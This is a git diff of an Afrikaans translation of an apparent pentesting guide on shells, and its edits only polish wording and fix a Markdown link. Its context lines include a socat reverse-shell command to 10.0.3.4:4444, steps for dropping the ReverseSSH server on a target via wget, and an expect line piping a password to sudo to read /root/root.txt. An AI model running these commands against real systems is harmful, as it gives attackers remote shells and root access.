@@ -73,9 +73,9 @@ socat exec:'bash -li',pty,stderr,setsid,sigint,sane tcp:10.0.3.4:4444
 
 ## ReverseSSH
 
-'n gerieflike manier vir **interaktiewe skulp toegang**, sowel as **lêer oordragte** en **poort forwarding**, is om die staties-gekoppelde ssh bediener [ReverseSSH](https://github.com/Fahrj/reverse-ssh) op die teiken te laat val.
+'n gerieflike manier vir **interaktiewe skulp toegang**, sowel as **lêer oordragte** en **poort forwarding**, is om die staties-gekoppelde ssh bediener [ReverseSSH](https://github.com/Fahrj/reverse-ssh) op die teiken te plaas.
 
-Hieronder is 'n voorbeeld vir `x86` met upx-gecomprimeerde binêre. Vir ander binêre, kyk [vrygawes bladsy](https://github.com/Fahrj/reverse-ssh/releases/latest/).
+Hieronder is 'n voorbeeld vir `x86` met upx-gecomprimeerde binêre. Vir ander binêre, kyk na die [vrygawes bladsy](https://github.com/Fahrj/reverse-ssh/releases/latest/).
 
 1. Berei plaaslik voor om die ssh poort forwarding versoek te vang:
 
@@ -99,7 +99,7 @@ wget -q https://github.com/Fahrj/reverse-ssh/releases/latest/download/upx_revers
 ```
 {% endcode %}
 
-* (2b) Windows 10 teiken (vir vroeëre weergawes, kyk na [projek leesmy] (https://github.com/Fahrj/reverse-ssh#features)):
+* (2b) Windows 10 teiken (vir vroeëre weergawes, kyk na [projek leesmy](https://github.com/Fahrj/reverse-ssh#features)):
 
 {% code overflow="wrap" %}
 ```bash
@@ -132,7 +132,7 @@ expect -c 'spawn sudo -S cat "/root/root.txt";expect "*password*";send "<THE_PAS
 ```
 <figure><img src="../../.gitbook/assets/image (2).png" alt=""><figcaption></figcaption></figure>
 
-Verdiep jou kundigheid in **Mobiele Sekuriteit** met 8kSec Akademie. Meester iOS en Android sekuriteit deur ons self-gebaseerde kursusse en kry gesertifiseer:
+Verdiep jou kundigheid in **Mobiele Sekuriteit** met 8kSec Akademie. Meester iOS en Android sekuriteit deur ons self-gebaseerde kursusse en kry sertifisering:
 
 {% embed url="https://academy.8ksec.io/" %}
 
